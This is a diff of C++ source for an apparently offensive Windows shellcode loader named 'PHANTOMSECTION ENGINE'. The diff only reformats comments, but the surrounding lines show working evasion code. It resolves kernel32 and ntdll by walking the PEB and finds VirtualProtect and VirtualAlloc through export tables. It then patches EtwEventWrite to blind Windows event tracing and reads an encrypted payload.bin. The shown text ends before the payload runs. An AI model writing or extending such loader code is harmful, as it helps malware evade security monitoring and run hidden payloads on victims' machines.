@@ -4,7 +4,7 @@
 #include <fstream>
 #include <vector>
 
-// --- PEB WALK STRUCTS ---
+//PEB WALK STRUCTS
 typedef struct _MY_LDR_DATA_TABLE_ENTRY {
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
@@ -16,7 +16,7 @@ typedef struct _MY_LDR_DATA_TABLE_ENTRY {
     UNICODE_STRING BaseDllName;
 } MY_LDR_DATA_TABLE_ENTRY, * PMY_LDR_DATA_TABLE_ENTRY;
 
-// --- MANUAL RESOLVER FUNCTIONS ---
+//MANUAL RESOLVER FUNCTIONS
 PVOID GetModuleBase(LPWSTR moduleName) {
     PPEB pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;
     PPEB_LDR_DATA pLdr = pPeb->Ldr;
@@ -52,12 +52,12 @@ PVOID GetFunctionAddress(PVOID moduleBase, LPCSTR functionName) {
 int main() {
     std::cout << "[*] === PHANTOMSECTION ENGINE STARTING ===" << std::endl;
 
-    // 1. Manually find Kernel32 and ntdll
+    // Manually find Kernel32 and ntdll
     PVOID kernel32Base = GetModuleBase((LPWSTR)L"KERNEL32.DLL");
     PVOID ntdllBase = GetModuleBase((LPWSTR)L"ntdll.dll");
     std::cout << "[+] Resolved Kernel32 and Ntdll via PEB Walk." << std::endl;
 
-    // 2. Manually resolve VirtualProtect and VirtualAlloc
+    //Manually resolve VirtualProtect and VirtualAlloc
     typedef BOOL(WINAPI* fnVirtualProtect)(PVOID, SIZE_T, DWORD, PDWORD);
     fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetFunctionAddress(kernel32Base, "VirtualProtect");
 
@@ -65,7 +65,7 @@ int main() {
     fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetFunctionAddress(kernel32Base, "VirtualAlloc");
     std::cout << "[+] Resolved functions via Export Address Table." << std::endl;
 
-    // --- PILLAR 2: ETW PATCHING ---
+    //ETW PATCHING 
     PVOID etwEventWriteAddr = GetFunctionAddress(ntdllBase, "EtwEventWrite");
     DWORD oldProtect = 0;
     pVirtualProtect(etwEventWriteAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
@@ -74,7 +74,7 @@ int main() {
     pVirtualProtect(etwEventWriteAddr, 1, oldProtect, &oldProtect);
     std::cout << "[+] Patched EtwEventWrite (ETW Blinded)." << std::endl;
 
-    // --- READ ENCRYPTED PAYLOAD FROM FILE ---
+    // READ ENCRYPTED PAYLOAD FROM FILE 
     std::ifstream file("payload.bin", std::ios::binary);
     if (!file) {
         std::cout << "[-] Failed to open payload.bin! Make sure it is in the same folder as the .exe" << std::endl;
